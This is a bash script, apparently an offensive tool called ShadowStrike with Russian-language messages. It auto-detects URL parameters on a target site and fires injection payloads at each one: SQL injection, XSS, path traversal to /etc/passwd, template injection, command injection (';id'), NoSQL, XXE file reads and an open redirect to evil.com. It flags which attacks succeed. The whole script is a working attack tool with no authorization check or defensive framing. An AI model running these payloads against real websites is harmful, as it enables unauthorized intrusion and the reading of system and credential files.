#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com?id=1" && exit 1

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — SMART INJECTIONS           ║"
echo "╚══════════════════════════════════════════════╝"

# Авто-определение параметров
PARAMS=$(curl -sk --max-time 10 "$TARGET" 2>/dev/null | grep -oP '(?:name|id|page|file|url|q|search|query|redirect|token|user|email)\s*[=:]' | sort -u | head -10)

echo "[INJ] Найдено параметров: $(echo "$PARAMS" | wc -l)"

# База инъекций с ожидаемыми ответами
declare -A INJECTIONS
INJECTIONS["SQLi"]="' OR '1'='1|sql|error|syntax|mysql"
INJECTIONS["XSS"]="<script>alert(1)</script>|<script>alert(1)</script>"
INJECTIONS["LFI"]="../../etc/passwd|root:"
INJECTIONS["SSTI"]="{{7*7}}|49"
INJECTIONS["CMDi"]=";id|uid=|gid="
INJECTIONS["NoSQL"]='{"$gt":""}|error|exception|unexpected'
INJECTIONS["XXE"]='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>|root:'
INJECTIONS["OpenRedirect"]="http://evil.com|evil.com"

echo "$PARAMS" | while read param; do
    pname="${param%[=:]*}"
    echo ""
    echo "  🔍 Тестирую параметр: $pname"
    
    for injection in "${!INJECTIONS[@]}"; do
        payload="${INJECTIONS[$injection]%%|*}"
        expected="${INJECTIONS[$injection]##*|}"
        
        RESP=$(curl -sk --max-time 5 "$TARGET?$pname=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null)" 2>/dev/null)
        
        if echo "$RESP" | grep -qiE "$expected"; then
            echo "    ✅ $injection РАБОТАЕТ!"
        fi
        sleep 0.3
    done
done

echo ""
echo "[INJ] Готово"
